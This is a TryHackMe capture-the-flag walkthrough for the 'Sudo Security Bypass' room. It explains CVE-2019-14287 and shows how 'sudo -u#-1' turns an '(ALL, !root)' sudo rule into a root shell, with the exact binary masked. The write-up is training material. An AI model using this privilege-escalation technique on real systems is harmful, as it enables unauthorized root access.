# Sudo Security Bypass

## Room
This a Try Hack Me room called `Sudo Security Bypass` 

The Web address for this room is
https://tryhackme.com/room/sudovulnsbypass

## Synopsis.
A tutorial room exploring CVE-2019-14287 in the Unix Sudo Program. Room One in the SudoVulns Series


---

## Getting started

Make sure you are connected to the Try Hack Me VPN before starting!

The first thing I do when starting a room is to note the victim and attacker's IP as given by Try Hack Me.

`export MYIP=10.9.9.10
export IP=10.10.10.10`

This format allows me to copy and paste in any terminal and use `$IP` anytime I need the victim's IP or `$MYIP` if I need my own

---

## Task 1 - Deploy!

This room is very beginner friendly. Enjoy the read, hit deploy, go.

---

## Task 2 - Security Bypass

I highly recommend reading through the explanations before getting started with the rest. You will find it very useful.

### #1 - What command are you allowed to run with sudo?

We are told to SSH to the machine:
`port: 2222
Username: tryhackme
Password: tryhackme`

This gives us the following command:
`ssh -p 2222 tryhackme@$IP`

Once we are in, we can run sudo -l to see what we can execute as sudo.
`sudo -l`

`User tryhackme may run the following commands on sudo-privesc:
    (ALL, !root) NOPASSWD: /xxx/xxxx`

You will find only one command is available. Go back to the explanations above the questions. this format `(ALL, !root)` is the one susceptible to CVE-2019-14287. It means we can pretend to be root by acting as user with id -1 and effectively become root.

A great ressource to always try when you find commands you can execute with sudo-l is https://gtfobins.github.io/

Type in the name of the command you found with sudo -l and click on the result to see the page.

The result is quite self-explanatory: 

`Shell
It can be used to break out from restricted environments by spawning an interactive system shell.
  xxxx`

This tells us we can escalate our privileges if we are able to run this command acting as root (with sudo).

Now let's piece it all together by following the hints from the description and adding this command :

`sudo -u#-1 xxxx` Again replace xxxx with the command.

You should now be root

`tryhackme@sudo-privesc:/$ sudo -u#-1 xxxx
root@sudo-privesc:/# `

And now, for the easy part, get the root.txt file in the root folder:

`cd /root
ls
cat root.txt`
